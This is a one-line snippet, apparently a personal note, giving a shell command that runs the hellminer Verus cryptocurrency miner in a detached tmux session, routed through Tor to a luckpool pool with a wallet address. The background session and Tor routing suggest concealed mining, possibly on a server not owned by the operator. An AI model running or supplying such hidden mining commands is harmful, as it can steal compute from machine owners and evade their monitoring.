#### |NOT RECOMENDED MB BUG| HELLMINER(VERUS): tmux new -ds servak torify ./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RSXVsvc1ngHoZzEvrzW5EUSaN8c2o47Xxt.BIG_TEST --cpu 2
